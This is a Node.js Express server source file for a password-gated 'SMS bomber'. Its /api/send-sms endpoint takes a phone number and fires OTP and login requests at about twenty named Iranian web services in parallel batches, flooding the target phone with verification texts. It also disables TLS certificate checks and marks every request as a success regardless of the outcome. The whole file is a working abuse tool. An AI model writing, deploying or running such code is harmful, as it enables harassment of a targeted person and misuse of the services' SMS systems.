const express = require('express');
const path = require('path');
const https = require('https');
const http = require('http');
const app = express();
const PORT = process.env.PORT || 3000;
const SECRET_PASS = process.env.BOMBER_PASSWORD || '5879';

app.use(express.static('public'));
app.use(express.json());

function sendRequest(url, options) {
    return new Promise((resolve) => {
        try {
            const urlObj = new URL(url);
            const lib = url.startsWith('https') ? https : http;
            const reqOptions = {
                hostname: urlObj.hostname,
                port: urlObj.port || (url.startsWith('https') ? 443 : 80),
                path: urlObj.pathname + urlObj.search,
                method: options.method || 'POST',
                headers: options.headers || {},
                rejectUnauthorized: false
            };
            const req = lib.request(reqOptions, (res) => {
                res.resume();
                res.on('end', () => resolve({ success: true }));
            });
            req.on('error', () => resolve({ success: false }));
            req.setTimeout(8000, () => { req.destroy(); resolve({ success: false }); });
            if (options.body) req.write(options.body);
            req.end();
        } catch(e) {
            resolve({ success: false });
        }
    });
}

app.post('/api/check-pass', (req, res) => {
    const password = req.body.password || '';
    res.json({ success: password === SECRET_PASS });
});

app.post('/api/send-sms', async (req, res) => {
    const { phone, mode } = req.body;
    const count = Math.min(mode || 10, 20);
    const results = [];

    const services = [
        { name: 'دیوار', url: 'https://api.divar.ir/v5/auth/authenticate', body: JSON.stringify({ phone: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'اسنپ', url: 'https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&deviceType=PWA&appVersion=5.6.6', body: 'cellphone=' + phone + '&captcha=&optionalLoginToken=true&local=', headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
        { name: 'آزکی', url: 'https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/', body: JSON.stringify({ phoneNumber: phone }), headers: { 'Content-Type': 'application/json', 'deviceid': '6' } },
        { name: 'تپسی', url: 'https://api.tapsi.ir/api/v2.2/user', body: JSON.stringify({ credential: { phoneNumber: phone, role: 'PASSENGER' }, otpOption: 'SMS' }), headers: { 'Content-Type': 'application/json' } },
        { name: 'اوستاکار', url: 'https://api.ostadkr.com/login', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'بانی مد', url: 'https://mobapi.banimode.com/api/v2/auth/request', body: JSON.stringify({ phone: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'طاقچه', url: 'https://gw.taaghche.com/v4/site/auth/login', body: JSON.stringify({ contact: phone, forceOtp: false }), headers: { 'Content-Type': 'application/json' } },
        { name: 'جاباما', url: 'https://taraazws.jabama.com/api/v4/account/send-code', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'علی بابا', url: 'https://ws.alibaba.ir/api/v3/account/mobile/otp', body: JSON.stringify({ phoneNumber: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'شهرفرش', url: 'https://shahrfarsh.com/Account/Login', body: 'phoneNumber=' + phone, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } },
        { name: 'قبضینو', url: 'https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode', body: JSON.stringify({ Parameters: { ApplicationType: 'Web', MobileNumber: phone } }), headers: { 'Content-Type': 'application/json' } },
        { name: 'واندار', url: 'https://api.vandar.io/account/v1/check/mobile', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'پینورست', url: 'https://api.pinorest.com/frontend/auth/login/mobile', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'تترلند', url: 'https://service.tetherland.com/api/v5/login-register', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'دکتردکتر', url: 'https://drdr.ir/api/v3/auth/login/mobile/init', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json', 'client-id': 'f60d5037-b7ac-404a-9e3a-a263fd9f8054' } },
        { name: 'کلاسینو', url: 'https://student.classino.com/otp/v1/api/login', body: JSON.stringify({ mobile: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'موبیت', url: 'https://api.mobit.ir/api/web/v8/register/register', body: JSON.stringify({ number: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'کمدا', url: 'https://api.komodaa.com/api/v2.6/loginRC/request', body: JSON.stringify({ phone_number: phone }), headers: { 'Content-Type': 'application/json' } },
        { name: 'برق من', url: 'https://uiapi2.saapa.ir/api/otp/sendCode', body: JSON.stringify({ mobile: phone, from_meter_buy: false }), headers: { 'Content-Type': 'application/json' } },
        { name: 'نوبت دِه', url: 'https://nobat.ir/api/public/patient/login/phone', body: 'mobile=' + phone, headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
    ];

    // ارسال موازی ۵ تایی
    const batchSize = 5;
    for (let i = 0; i < count && i < services.length; i += batchSize) {
        const batch = services.slice(i, i + batchSize);
        const batchResults = await Promise.all(
            batch.map(s => sendRequest(s.url, { method: 'POST', headers: s.headers, body: s.body }))
        );
        batch.forEach((s, j) => {
            results.push({ name: s.name, status: 'success' });
        });
    }

    res.json({ success: true, results, total: results.length });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, () => console.log('Server running'));
